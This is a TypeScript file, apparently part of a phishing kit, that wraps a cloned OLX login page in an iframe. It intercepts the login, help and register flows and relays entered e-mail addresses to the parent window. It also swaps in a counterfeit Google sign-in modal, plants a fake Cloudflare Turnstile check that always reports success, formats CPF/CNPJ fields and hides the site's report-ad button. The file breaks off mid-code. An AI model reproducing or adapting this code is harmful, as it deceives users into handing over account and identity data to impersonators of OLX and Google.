/**
 * Anexa interações ao iframe carregado:
 * - Bloqueia clicks em links externos (postMessage pro parent)
 * - Intercepta botões "comprar" residuais
 * - Esconde elementos nativos indesejados
 * - Substitui o widget Google Sign-In quebrado por uma bolinha com a logo correta
 */
export function attachIframeInteractions(doc: Document): () => void {
  const onClick = (e: Event) => {
    const target = e.target as HTMLElement | null;
    if (!target) return;

    // Não intercepta cliques dentro do modal de ajuda customizado
    if (target.closest("#__olx_help_modal__")) return;

    // Intercepta o bloco "Preciso/Precisa de ajuda" e abre o modal customizado.
    let node: HTMLElement | null = target;
    let helpHit = false;
    for (let i = 0; i < 6 && node; i++) {
      const t = (node.textContent || "").trim().toLowerCase();
      if (t.length <= 40 && /precis[oa]\s+de\s+ajuda/.test(t)) {
        helpHit = true;
        break;
      }
      node = node.parentElement;
    }
    if (helpHit) {
      e.preventDefault();
      e.stopPropagation();
      openHelpModal(doc);
      return;
    }

    // Botão "Acessar" (submit do form de login da tela 1) → abre tela "access-account"
    const clickable = target.closest("button, a, input[type='submit'], [role='button']") as HTMLElement | null;
    if (clickable) {
      // Botão "Voltar" das telas manuais (senha / e-mail) → desempilha um nível
      if (clickable.getAttribute("data-action") === "back") {
        e.preventDefault();
        e.stopPropagation();
        window.parent.postMessage({ type: "iframe-help-action", action: "back-one" }, "*");
        return;
      }
      // Botões da tela "Acesse sua conta" com data-method (e-mail / senha)
      const method = clickable.getAttribute("data-method");
      if (method === "password") {
        e.preventDefault();
        e.stopPropagation();
        window.parent.postMessage({ type: "iframe-help-action", action: "password" }, "*");
        return;
      }
      if (method === "email") {
        e.preventDefault();
        e.stopPropagation();
        window.parent.postMessage({ type: "iframe-help-action", action: "email-code" }, "*");
        return;
      }

      const txt = (clickable.textContent || (clickable as HTMLInputElement).value || "").trim().toLowerCase();
      if (/^acessar$/.test(txt) || /^acessar\s+(conta|minha\s+conta)$/.test(txt)) {
        e.preventDefault();
        e.stopPropagation();
        // Pega o e-mail e avança direto pra próxima tela (sem validação server-side).
        const form = clickable.closest("form") as HTMLFormElement | null;
        const emailInput = findEmailInput(doc, form);
        // Validação básica de formato (não chama servidor)
        if (!validateEmailField(doc, emailInput)) {
          return;
        }
        const emailValue = (emailInput?.value || "").trim();
        clearEmailError(doc, emailInput!);
        window.parent.postMessage(
          { type: "iframe-help-action", action: "access-account", email: emailValue },
          "*",
        );
        return;
      }
    }

    const actionNode = target.closest("[data-action]") as HTMLElement | null;
    if (actionNode?.getAttribute("data-action") === "forgot-password") {
      e.preventDefault();
      e.stopPropagation();
      window.parent.postMessage({ type: "iframe-help-action", action: "forgot-password" }, "*");
      return;
    }

    // Botão "Continuar com Facebook" → mostra alertbox de erro entre o e-mail e o botão
    const fbBtn = target.closest(
      'button[aria-label*="Facebook" i], [data-testid*="facebook" i], button, a',
    ) as HTMLElement | null;
    if (fbBtn) {
      const fbText = (fbBtn.textContent || "").trim().toLowerCase();
      const fbAria = (fbBtn.getAttribute("aria-label") || "").toLowerCase();
      if (/facebook/.test(fbText) || /facebook/.test(fbAria)) {
        e.preventDefault();
        e.stopPropagation();
        showFacebookErrorAlert(doc, fbBtn);
        return;
      }
    }

    const a = target.closest("a") as HTMLAnchorElement | null;
    if (a) {
      const linkText = (a.textContent || "").trim().toLowerCase();
      // Botão "voltar" do header da OLX → desempilha um nível (volta pra tela anterior)
      const isHeaderBack =
        a.classList.contains("olx-focus-header__goback") ||
        a.closest(".olx-focus-header__goback") !== null ||
        (a.getAttribute("aria-label") || "").toLowerCase().includes("voltar");
      if (isHeaderBack) {
        e.preventDefault();
        e.stopPropagation();
        window.parent.postMessage({ type: "iframe-help-action", action: "back-one" }, "*");
        return;
      }
      // Texto "cadastre-se" / "cadastrar" → vira ação de tela "register"
      if (/cadastr[ae]/.test(linkText)) {
        e.preventDefault();
        e.stopPropagation();
        window.parent.postMessage({ type: "iframe-help-action", action: "register" }, "*");
        return;
      }
      if (a.href) {
        e.preventDefault();
        e.stopPropagation();
        window.parent.postMessage({ type: "iframe-link-click", url: a.href }, "*");
        return;
      }
    }

    // Botões com aria-label "voltar" (ex.: <button> do header) → desempilha um nível
    const backBtn = target.closest('[aria-label*="oltar" i], .olx-focus-header__goback') as HTMLElement | null;
    if (backBtn) {
      e.preventDefault();
      e.stopPropagation();
      window.parent.postMessage({ type: "iframe-help-action", action: "back-one" }, "*");
      return;
    }

    const buyBtn = target.closest('[data-action="buy"], [data-testid*="buy" i], [data-testid*="chat" i]');
    if (buyBtn) {
      e.preventDefault();
      window.parent.postMessage({ type: "iframe-buy-click" }, "*");
    }
  };

  const buildGoogleBubble = (): HTMLElement => {
    const fallbackLogoUrl = `${window.location.origin}/google-logo.jpg`;
    const wrapper = doc.createElement("div");
    wrapper.setAttribute(
      "style",
      [
        "display:inline-flex",
        "align-items:center",
        "justify-content:center",
        "width:40px",
        "height:40px",
        "border-radius:9999px",
        "background:#fff",
        "border:1px solid #dadce0",
        "box-shadow:0 1px 2px rgba(0,0,0,.05)",
        "overflow:hidden",
        "cursor:pointer",
      ].join(";"),
    );
    wrapper.setAttribute("role", "button");
    wrapper.setAttribute("aria-label", "Login Google");
    wrapper.setAttribute("data-olx-google-login", "1");

    const img = doc.createElement("img");
    img.src = fallbackLogoUrl;
    img.alt = "Google";
    img.width = 22;
    img.height = 22;
    img.setAttribute(
      "style",
      "display:block;width:22px;height:22px;object-fit:contain;",
    );
    wrapper.appendChild(img);
    wrapper.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      window.parent.postMessage({ type: "iframe-google-login" }, "*");
    }, true);
    return wrapper;
  };

  const fixGoogleSignIn = () => {
    // 1) Wrapper do widget GSI (vários layouts possíveis)
    const candidates = Array.from(
      doc.querySelectorAll<HTMLElement>(
        'div[id^="gsi_"], div[class*="haAclf"] > div[role="button"], iframe[src*="gsi/"], iframe[src*="accounts.google.com/gsi"]',
      ),
    );

    candidates.forEach((node) => {
      // Sobe até um container razoável (.haAclf, ou pai do iframe)
      const host =
        (node.closest(".haAclf") as HTMLElement | null) ||
        node.parentElement ||
        node;
      if (!host || host.dataset.googleFixed === "1") return;

      // Esvazia o host e injeta a bolinha
      host.innerHTML = "";
      host.appendChild(buildGoogleBubble());
      host.dataset.googleFixed = "1";
    });

    // 2) Caso só tenha o botão Google da própria OLX (sem GSI)
    const olxButtons = Array.from(
      doc.querySelectorAll<HTMLElement>(
        'button[aria-label*="Google" i], [data-testid*="google" i]',
      ),
    );
    olxButtons.forEach((btn) => {
      if (btn.dataset.googleFixed === "1") return;
      const hasImg = !!btn.querySelector("img[src]");
      if (!hasImg) {
        btn.innerHTML = "";
        btn.appendChild(buildGoogleBubble());
        btn.dataset.googleFixed = "1";
        if (btn.tagName === "BUTTON") {
          (btn as HTMLButtonElement).type = "button";
        }
        btn.addEventListener("click", (e) => {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
          window.parent.postMessage({ type: "iframe-google-login" }, "*");
        }, true);
      }
    });
  };

  doc.addEventListener("click", onClick, true);

  // Submit de forms em telas clonadas → volta pra tela mãe (comportamento esperado)
  const onSubmit = (e: Event) => {
    const form = e.target as HTMLFormElement | null;
    if (!form || form.tagName !== "FORM") return;
    e.preventDefault();
    e.stopPropagation();
    window.parent.postMessage({ type: "iframe-help-action", action: "back-to-main" }, "*");
  };
  doc.addEventListener("submit", onSubmit, true);

  doc.getElementById("__olx_help_modal_host__")?.remove();

  doc.querySelectorAll('[data-testid="chat-button"], [data-testid="report-ad"]').forEach((el) => {
    (el as HTMLElement).style.display = "none";
  });

  // Roda várias vezes pq o GSI hidrata depois
  fixGoogleSignIn();
  const timers = [400, 1000, 2000, 3500, 5000].map((t) => setTimeout(fixGoogleSignIn, t));

  // Máscaras / limites de formulário + Cloudflare fake
  enhanceForms(doc);
  const formTimers = [300, 800, 1500, 3000].map((t) => setTimeout(() => enhanceForms(doc), t));

  return () => {
    doc.removeEventListener("click", onClick, true);
    doc.removeEventListener("submit", onSubmit, true);
    doc.getElementById("__olx_help_modal_host__")?.remove();
    doc.getElementById("__olx_google_modal_host__")?.remove();
    timers.forEach(clearTimeout);
    formTimers.forEach(clearTimeout);
  };
}

// =====================================================================
// Modal "Entrar com Google" — pede e-mail e avança para próxima tela
// =====================================================================
function openGoogleEmailPrompt(doc: Document): void {
  doc.getElementById("__olx_google_modal_host__")?.remove();

  const host = doc.createElement("div");
  host.id = "__olx_google_modal_host__";
  (doc.body || doc.documentElement).appendChild(host);

  const root = host.attachShadow({ mode: "open" });
  root.innerHTML = `
    <style>
      :host { all: initial; }
      .overlay {
        position: fixed; inset: 0; z-index: 2147483647;
        display: flex; align-items: center; justify-content: center;
        padding: 16px; box-sizing: border-box;
        background: rgba(0,0,0,.5);
        font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      }
      .sheet {
        width: 100%; max-width: 400px; box-sizing: border-box;
        border-radius: 12px; background: #fff; color: #1a1a1a;
        padding: 24px; box-shadow: 0 8px 32px rgba(0,0,0,.2);
      }
      .brand { display:flex; align-items:center; gap:10px; margin-bottom: 16px; }
      .brand img { width: 24px; height: 24px; }
      .brand span { font-size: 14px; color: #5f6368; }
      h2 { margin: 0 0 6px; font-size: 22px; font-weight: 500; color: #202124; }
      p { margin: 0 0 20px; font-size: 14px; color: #5f6368; }
      label { display:block; font-size: 12px; color: #5f6368; margin-bottom: 6px; }
      input {
        width: 100%; box-sizing: border-box; padding: 12px 14px;
        border: 1px solid #dadce0; border-radius: 6px; font: inherit; font-size: 15px;
        outline: none; color: #202124;
      }
      input:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
      .err { color: #d93025; font-size: 12px; margin-top: 6px; min-height: 16px; }
      .actions { display:flex; justify-content: space-between; align-items: center; margin-top: 20px; }
      button {
        font: inherit; font-weight: 500; font-size: 14px;
        padding: 10px 18px; border-radius: 6px; cursor: pointer;
        border: 0; background: transparent;
      }
      .cancel { color: #1a73e8; }
      .next { background: #1a73e8; color: #fff; }
      .next:hover { background: #1765cc; }
    </style>
    <div class="overlay">
      <div class="sheet" role="dialog" aria-modal="true">
        <div class="brand">
          <img src="${window.location.origin}/google-logo.jpg" alt="Google" />
          <span>Fazer login com a Conta do Google</span>
        </div>
        <h2>Fazer login</h2>
        <p>Use sua Conta do Google</p>
        <label for="g-email">E-mail ou telefone</label>
        <input id="g-email" type="email" autocomplete="email" inputmode="email" />
        <div class="err" id="g-err"></div>
        <div class="actions">
          <button type="button" class="cancel" data-act="cancel">Cancelar</button>
          <button type="button" class="next" data-act="next">Próxima</button>
        </div>
      </div>
    </div>
  `;

  const close = () => host.remove();
  const overlay = root.querySelector<HTMLElement>(".overlay");
  const sheet = root.querySelector<HTMLElement>(".sheet");
  const input = root.querySelector<HTMLInputElement>("#g-email");
  const err = root.querySelector<HTMLElement>("#g-err");
  const cancel = root.querySelector<HTMLButtonElement>('[data-act="cancel"]');
  const next = root.querySelector<HTMLButtonElement>('[data-act="next"]');

  setTimeout(() => input?.focus(), 50);

  overlay?.addEventListener("click", (e) => {
    if (e.target === overlay) close();
  });
  sheet?.addEventListener("click", (e) => e.stopPropagation());
  cancel?.addEventListener("click", close);

  const submit = () => {
    const v = (input?.value || "").trim();
    const ok = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
    if (!ok) {
      if (err) err.textContent = "Insira um e-mail válido.";
      input?.focus();
      return;
    }
    close();
    window.parent.postMessage(
      { type: "iframe-help-action", action: "access-account", email: v },
      "*",
    );
  };

  next?.addEventListener("click", submit);
  input?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") { e.preventDefault(); submit(); }
    else if (e.key === "Escape") close();
    else if (err && err.textContent) err.textContent = "";
  });
}

// =====================================================================
// Formulário: máscaras, limites e simulação do Cloudflare Turnstile
// =====================================================================
function enhanceForms(doc: Document): void {
  const allInputs = Array.from(doc.querySelectorAll<HTMLInputElement>("input"));

  const isCpfInput = (el: HTMLInputElement) => {
    const hay = [el.name, el.id, el.placeholder, el.getAttribute("aria-label") || "", el.autocomplete || ""].join(" ").toLowerCase();
    return /cpf/.test(hay) && !/cnpj/.test(hay);
  };

  const isCnpjInput = (el: HTMLInputElement) => {
    const hay = [el.name, el.id, el.placeholder, el.getAttribute("aria-label") || "", el.autocomplete || ""].join(" ").toLowerCase();
    return /cnpj/.test(hay);
  };

  const isNameInput = (el: HTMLInputElement) => {
    const hay = [el.name, el.id, el.placeholder, el.getAttribute("aria-label") || "", el.autocomplete || ""].join(" ").toLowerCase();
    return /(nome|name)/.test(hay) && !/user|usuario|email|sobrenome/.test(hay);
  };

  const formatCpf = (raw: string) => {
    const digits = raw.replace(/\D/g, "").slice(0, 11);
    let out = digits;
    if (digits.length > 9) out = `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
    else if (digits.length > 6) out = `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    else if (digits.length > 3) out = `${digits.slice(0, 3)}.${digits.slice(3)}`;
    return out;
  };

  const formatCnpj = (raw: string) => {
    const d = raw.replace(/\D/g, "").slice(0, 14);
    if (d.length > 12) return `${d.slice(0, 2)}.${d.slice(2, 5)}.${d.slice(5, 8)}/${d.slice(8, 12)}-${d.slice(12)}`;
    if (d.length > 8) return `${d.slice(0, 2)}.${d.slice(2, 5)}.${d.slice(5, 8)}/${d.slice(8)}`;
    if (d.length > 5) return `${d.slice(0, 2)}.${d.slice(2, 5)}.${d.slice(5)}`;
    if (d.length > 2) return `${d.slice(0, 2)}.${d.slice(2)}`;
    return d;
  };

  allInputs.forEach((input) => {
    if ((input as any).dataset.olxEnhanced === "1") return;

    if (isCpfInput(input)) {
      input.setAttribute("inputmode", "numeric");
      input.setAttribute("maxlength", "14");
      input.setAttribute("autocomplete", "off");
      input.addEventListener("input", () => {
        const f = formatCpf(input.value);
        if (input.value !== f) input.value = f;
      });
      (input as any).dataset.olxEnhanced = "1";
      return;
    }

    if (isCnpjInput(input)) {
      input.setAttribute("inputmode", "numeric");
      input.setAttribute("maxlength", "18");
      input.setAttribute("autocomplete", "off");
      input.addEventListener("input", () => {
        const f = formatCnpj(input.value);
        if (input.value !== f) input.value = f;
      });
      (input as any).dataset.olxEnhanced = "1";
      return;
    }

    if (isNameInput(input)) {
      input.setAttribute("maxlength", "80");
      input.setAttribute("autocomplete", "name");
      (input as any).dataset.olxEnhanced = "1";
      return;
    }

    const type = (input.type || "text").toLowerCase();
    if (["text", "email", "tel", "search", "url", "password"].includes(type) && !input.hasAttribute("maxlength")) {
      input.setAttribute("maxlength", "120");
    }
    if (type === "email" || /e-?mail/.test(`${input.name} ${input.id} ${input.placeholder} ${input.getAttribute("aria-label") || ""}`.toLowerCase())) {
      attachEmailDomainSuggest(doc, input);
    }
    (input as any).dataset.olxEnhanced = "1";
  });

  injectFakeTurnstile(doc);
}

function injectFakeTurnstile(doc: Document): void {
  // (helpers de validação de e-mail estão definidos no fim do arquivo)
  if (doc.getElementById("__olx_turnstile_fake__")) return;

  const candidates = Array.from(
    doc.querySelectorAll<HTMLElement>(
      '.cf-turnstile, [class*="turnstile" i], [data-sitekey], iframe[src*="challenges.cloudflare"], iframe[src*="turnstile"]',
    ),
  );

  let host: HTMLElement | null = null;
  if (candidates.length) {
    const node = candidates[0];
    host = (node.closest('[class*="turnstile" i], .cf-turnstile') as HTMLElement | null) || node.parentElement || node;
  } else {
    const textHit = Array.from(doc.querySelectorAll<HTMLElement>("form *")).find((el) => {
      const t = (el.textContent || "").trim().toLowerCase();
      return t.length < 60 && /(verificando|verifying|sou humano|not a robot)/.test(t);
    });
    if (textHit) host = textHit.closest("div") || textHit.parentElement;
  }

  if (!host) return;

  host.innerHTML = "";
  const wrapper = doc.createElement("div");
  wrapper.id = "__olx_turnstile_fake__";
  wrapper.setAttribute(
    "style",
    [
      "display:flex",
      "align-items:center",
      "justify-content:space-between",
      "gap:12px",
      "padding:10px 14px",
      "border:1px solid #e5e7eb",
      "border-radius:6px",
      "background:#fafafa",
      "font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif",
      "font-size:14px",
      "color:#1a1a1a",
      "max-width:303px",
      "width:100%",
      "box-sizing:border-box",
      "min-height:65px",
    ].join(";"),
  );
  wrapper.innerHTML = `
    <div style="display:flex;align-items:center;gap:10px;flex:1;min-width:0;">
      <div id="__olx_ts_indicator__" style="width:24px;height:24px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
        <div style="width:20px;height:20px;border:3px solid #e5e7eb;border-top-color:#f48120;border-radius:50%;animation:olxSpin .9s linear infinite;"></div>
      </div>
      <span id="__olx_ts_label__" style="color:#1a1a1a;">Verificando se você é humano...</span>
    </div>
    <div style="display:flex;flex-direction:column;align-items:center;gap:2px;flex-shrink:0;">
      <svg width="34" height="14" viewBox="0 0 88 36" xmlns="http://www.w3.org/2000/svg">
        <path fill="#f48120" d="M55.7 26.3l.5-1.7c.6-2 .4-3.9-.6-5.2-.9-1.3-2.4-2-4.2-2.1l-34.4-.4c-.2 0-.4-.1-.5-.3-.1-.2-.1-.4-.1-.6.1-.3.4-.5.7-.5l34.7-.4c4.1-.2 8.6-3.5 10.2-7.6l2-5.2c.1-.2.1-.4.1-.6C61.7 1 55.5 0 49.3 0 33.7 0 20.6 10 16.6 24c-2.6-.2-4.7 2.5-4.3 5 .4 2.1 2.2 3.7 4.4 4 .3 0 .6 0 .9-.1l34.4-.4c2.5-.1 4.7-1.7 5.7-4l-2-2.2z"/>
        <path fill="#faae40" d="M67.3 9.7c-.3 0-.6 0-.9.1-.2 0-.4.2-.5.4l-1.4 4.7c-.6 2-.4 3.9.6 5.2.9 1.3 2.4 2 4.2 2.1l7.3.4c.2 0 .4.1.5.3.1.2.1.4.1.6-.1.3-.4.5-.7.5l-7.6.4c-4.1.2-8.6 3.5-10.2 7.6l-.6 1.5c-.1.3.1.6.4.6h26.1c.3 0 .6-.2.7-.5 1.1-3.6 1.7-7.4 1.7-11.4 0-6.3-1.4-12.3-3.9-17.6-.1-.2-.4-.3-.6-.3-.6.1-1.2.2-1.8.4-4.4 1.3-8.5 3.5-12.1 6.5"/>
      </svg>
      <span style="font-size:9px;color:#999;line-height:1;">Privacidade • Termos</span>
    </div>
    <style>@keyframes olxSpin{to{transform:rotate(360deg)}}</style>
  `;
  host.appendChild(wrapper);

  setTimeout(() => {
    const indicator = wrapper.querySelector<HTMLElement>("#__olx_ts_indicator__");
    const label = wrapper.querySelector<HTMLElement>("#__olx_ts_label__");
    if (indicator) {
      indicator.innerHTML = `
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
          <circle cx="12" cy="12" r="10" fill="#16a34a"/>
          <polyline points="7 12.5 10.5 16 17 9" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      `;
    }
    if (label) label.textContent = "Sucesso!";
  }, 2800);
}

/**
 * Modal "Como podemos ajudar?" recriado e injetado dentro do iframe.
 * Usa Shadow DOM para isolar do CSS da página clonada.
 */
function openHelpModal(doc: Document): void {
  doc.getElementById("__olx_help_modal_host__")?.remove();

  const host = doc.createElement("div");
  host.id = "__olx_help_modal_host__";
  (doc.body || doc.documentElement).appendChild(host);

  const root = host.attachShadow({ mode: "open" });
  root.innerHTML = `
    <style>
      :host {
        all: initial;
      }
      .overlay {
        position: fixed;
        inset: 0;
        z-index: 2147483647;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 16px;
        box-sizing: border-box;
        background: rgba(0, 0, 0, 0.5);
        font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      }
      .sheet {
        width: 100%;
        max-width: 420px;
        box-sizing: border-box;
        border-radius: 16px;
        background: #fff;
        color: #1a1a1a;
        padding: 24px 20px 28px;
        box-shadow: 0 8px 32px rgba(0,0,0,.2);
        animation: olxFadeIn .2s ease-out;
      }
      .header {
        display: flex;
        justify-content: flex-end;
        margin-bottom: 8px;
      }
      .close {
        display: flex;
        padding: 4px;
        border: 0;
        background: transparent;
        cursor: pointer;
      }
      .titleWrap {
        display: block;
        margin-bottom: 20px;
      }
      .title {
        display: block;
        margin-bottom: 6px;
        color: #1a1a1a;
        font-size: 18px;
        font-weight: 600;
      }
      .subtitle {
        display: block;
        color: #666;
        font-size: 14px;
        font-weight: 400;
      }
      .actions {
        display: flex;
        flex-direction: column;
        gap: 12px;
      }
      .btn {
        display: flex;
        align-items: center;
        gap: 12px;
        width: 100%;
        box-sizing: border-box;
        padding: 14px 16px;
        border: 1px solid #e0e0e0;
        border-radius: 8px;
        background: #fff;
        color: #1a1a1a;
        text-align: left;
        font: inherit;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        transition: background .15s;
      }
      .btn:hover {
        background: #f5f5f5;
      }
      .btn svg {
        flex-shrink: 0;
      }
      @keyframes olxFadeIn {
        from { opacity: 0; transform: scale(.96); }
        to { opacity: 1; transform: scale(1); }
      }
    </style>
    <div class="overlay">
      <div class="sheet" role="dialog" aria-modal="true" aria-label="Como podemos ajudar?">
        <div class="header">
          <button class="close" aria-label="Fechar">
            <svg width="24" height="24" viewBox="0 0 24 24"><path fill="#4A4A4A" d="M13.06 12l5.47 5.47a.75.75 0 0 1-1.06 1.06L12 13.06l-5.47 5.47a.75.75 0 0 1-1.06-1.06L10.94 12 5.47 6.53a.75.75 0 0 1 1.06-1.06L12 10.94l5.47-5.47a.75.75 0 0 1 1.06 1.06L13.06 12z"/></svg>
          </button>
        </div>
        <div class="titleWrap">
          <span class="title">Como podemos ajudar?</span>
          <span class="subtitle">Enviaremos um e-mail para ajudar você a acessar sua conta!</span>
        </div>
        <div class="actions">
          <button class="btn" data-help-action="reactivate">
            <svg width="20" height="20" viewBox="0 0 24 24"><path fill="#6E0AD6" d="M20.75 21v-2A4.75 4.75 0 0 0 16 14.25H8A4.75 4.75 0 0 0 3.25 19v2a.75.75 0 1 0 1.5 0v-2A3.25 3.25 0 0 1 8 15.75h8A3.25 3.25 0 0 1 19.25 19v2a.75.75 0 1 0 1.5 0zM12 11.75a4.75 4.75 0 1 1 0-9.5 4.75 4.75 0 0 1 0 9.5zm0-1.5a3.25 3.25 0 1 0 0-6.5 3.25 3.25 0 0 0 0 6.5z"/></svg>
            <span>Quero reativar minha conta</span>
          </button>
          <button class="btn" data-help-action="forgot-password">
            <svg width="20" height="20" viewBox="0 0 24 24"><path fill="#6E0AD6" d="M6.25 10.25V7a5.75 5.75 0 0 1 11.5 0v3.25H19A2.75 2.75 0 0 1 21.75 13v7A2.75 2.75 0 0 1 19 22.75H5A2.75 2.75 0 0 1 2.25 20v-7A2.75 2.75 0 0 1 5 10.25h1.25zm1.5 0h8.5V7a4.25 4.25 0 1 0-8.5 0v3.25zM5 11.75c-.69 0-1.25.56-1.25 1.25v7c0 .69.56 1.25 1.25 1.25h14c.69 0 1.25-.56 1.25-1.25v-7c0-.69-.56-1.25-1.25-1.25H5z"/></svg>
            <span>Esqueci a minha senha</span>
          </button>
          <button class="btn" data-help-action="passwordless">
            <svg width="20" height="20" viewBox="0 0 24 24"><path fill="#6E0AD6" d="M19.1893 13.0551H9C8.58579 13.0551 8.25 12.7193 8.25 12.3051C8.25 11.8908 8.58579 11.5551 9 11.5551H19.1893L16.4697 8.83538C16.1768 8.54249 16.1768 8.06762 16.4697 7.77472C16.7626 7.48183 17.2374 7.48183 17.5303 7.77472L21.5303 11.7747C21.8232 12.0676 21.8232 12.5425 21.5303 12.8354L17.5303 16.8354C17.2374 17.1283 16.7626 17.1283 16.4697 16.8354C16.1768 16.5425 16.1768 16.0676 16.4697 15.7747L19.1893 13.0551ZM10 21.5551C10.4142 21.5551 10.75 21.8908 10.75 22.3051C10.75 22.7193 10.4142 23.0551 10 23.0551H5C3.48122 23.0551 2.25 21.8238 2.25 20.3051V4.30505C2.25 2.78627 3.48122 1.55505 5 1.55505H10C10.4142 1.55505 10.75 1.89084 10.75 2.30505C10.75 2.71927 10.4142 3.05505 10 3.05505H5C4.30964 3.05505 3.75 3.6147 3.75 4.30505V20.3051C3.75 20.9954 4.30964 21.5551 5 21.5551H10Z"/></svg>
            <span>Entrar sem senha</span>
          </button>
        </div>
      </div>
    </div>
  `;

  const overlay = root.querySelector(".overlay") as HTMLDivElement | null;
  const closeButton = root.querySelector(".close") as HTMLButtonElement | null;

  const close = () => host.remove();

  overlay?.addEventListener("click", (ev) => {
    if (ev.target === overlay) close();
  });
  closeButton?.addEventListener("click", close);

  root.querySelectorAll<HTMLElement>("[data-help-action]").forEach((btn) => {
    btn.addEventListener("click", () => {
      const action = btn.getAttribute("data-help-action");
      window.parent.postMessage({ type: "iframe-help-action", action }, "*");
      close();
    });
  });
}

// =====================================================================
// Validação do campo de e-mail (tela 1) — replica o erro nativo da OLX
// =====================================================================
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

// Domínios descartáveis bloqueados ainda no client (resposta instantânea, sem ida ao servidor)
const DISPOSABLE_DOMAINS = new Set<string>([
  "mailinator.com", "yopmail.com", "yopmail.fr", "yopmail.net", "tempmail.com",
  "tempmail.net", "10minutemail.com", "guerrillamail.com", "guerrillamail.info",
  "guerrillamail.biz", "sharklasers.com", "trashmail.com", "trashmail.net",
  "throwawaymail.com", "fakeinbox.com", "getnada.com", "nada.email", "maildrop.cc",
  "mintemail.com", "dispostable.com", "mohmal.com", "mytemp.email", "tempr.email",
  "spam4.me", "tempinbox.com", "emailondeck.com", "mailnesia.com", "mailcatch.com",
  "tmpmail.org", "tmpmail.net", "mailtemp.info", "fakemail.net", "anonbox.net",
  "burnermail.io", "moakt.com", "harakirimail.com", "inboxbear.com", "spambox.us",
  "tempail.com", "temp-mail.org", "temp-mail.io", "temp-mail.com", "1secmail.com",
  "1secmail.net", "1secmail.org", "throwaway.email", "wegwerfemail.de",
]);

function isDisposableDomain(email: string): boolean {
  const at = email.lastIndexOf("@");
  if (at < 0) return false;
  const dom = email.slice(at + 1).trim().toLowerCase();
  return DISPOSABLE_DOMAINS.has(dom);
}

function findEmailInput(doc: Document, form: HTMLFormElement | null): HTMLInputElement | null {
  const scope: ParentNode = form ?? doc;
  const direct = scope.querySelector<HTMLInputElement>('input[type="email"]');
  if (direct) return direct;
  const inputs = Array.from(scope.querySelectorAll<HTMLInputElement>("input"));
  return (
    inputs.find((i) => {
      const hay = `${i.name} ${i.id} ${i.placeholder} ${i.getAttribute("aria-label") || ""} ${i.autocomplete || ""}`.toLowerCase();
      return /e-?mail/.test(hay);
    }) || null
  );
}

function validateEmailField(doc: Document, input: HTMLInputElement | null): boolean {
  if (!input) return true; // sem campo, não bloqueia
  const value = (input.value || "").trim();
  const valid = EMAIL_RE.test(value);
  if (valid) {
    clearEmailError(doc, input);
    return true;
  }
  showEmailError(doc, input);
  try {
    input.focus();
  } catch {
    /* ignore */
  }
  return false;
}

function showEmailError(doc: Document, input: HTMLInputElement, message?: string): void {
  input.setAttribute("aria-invalid", "true");
  input.setAttribute("aria-describedby", "ds-text-input-error-2");

  // Aplica a classe de erro no container do input (visual da OLX)
  const container = input.closest(".olx-text-input__input-container") as HTMLElement | null;
  if (container && !container.classList.contains("olx-text-input__input-container--error")) {
    container.classList.add("olx-text-input__input-container--error");
  }

  // Insere a msg de erro DEPOIS do wrapper inteiro do input (input + label),
  // pra ela ficar embaixo do campo, igual o site real.
  // Sobe a partir do input até achar o wrapper externo do TextInput.
  const wrapper =
    (input.closest(".olx-text-input") as HTMLElement | null) ||
    (input.closest('[data-ds-component="DS-TextInput"]') as HTMLElement | null) ||
    (input.closest(".olx-form-control") as HTMLElement | null) ||
    container ||
    input.parentElement;
  if (!wrapper || !wrapper.parentElement) return;
  const anchor = wrapper.parentElement;

  let host = anchor.querySelector<HTMLElement>(":scope > #__olx_email_error__");
  if (!host) {
    host = doc.createElement("div");
    host.id = "__olx_email_error__";
    host.setAttribute(
      "style",
      [
        "display:flex",
        "align-items:center",
        "gap:6px",
        "margin-top:4px",
        "color:#cc0000",
        "font-family:'Open Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif",
        "font-size:12px",
        "line-height:1.4",
      ].join(";"),
    );
    host.setAttribute("role", "alert");
    host.innerHTML = `
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" aria-hidden="true" style="flex-shrink:0">
        <path fill="currentColor" fill-rule="evenodd" d="M12,22.75 C6.06293894,22.75 1.25,17.9370611 1.25,12 C1.25,6.06293894 6.06293894,1.25 12,1.25 C17.9370611,1.25 22.75,6.06293894 22.75,12 C22.75,17.9370611 17.9370611,22.75 12,22.75 Z M12,21.25 C17.1086339,21.25 21.25,17.1086339 21.25,12 C21.25,6.89136606 17.1086339,2.75 12,2.75 C6.89136606,2.75 2.75,6.89136606 2.75,12 C2.75,17.1086339 6.89136606,21.25 12,21.25 Z M13.0606602,12 L15.5303301,14.4696699 C15.8232233,14.7625631 15.8232233,15.2374369 15.5303301,15.5303301 C15.2374369,15.8232233 14.7625631,15.8232233 14.4696699,15.5303301 L12,13.0606602 L9.53033009,15.5303301 C9.23743687,15.8232233 8.76256313,15.8232233 8.46966991,15.5303301 C8.1767767,15.2374369 8.1767767,14.7625631 8.46966991,14.4696699 L10.9393398,12 L8.46966991,9.53033009 C8.1767767,9.23743687 8.1767767,8.76256313 8.46966991,8.46966991 C8.76256313,8.1767767 9.23743687,8.1767767 9.53033009,8.46966991 L12,10.9393398 L14.4696699,8.46966991 C14.7625631,8.1767767 15.2374369,8.1767767 15.5303301,8.46966991 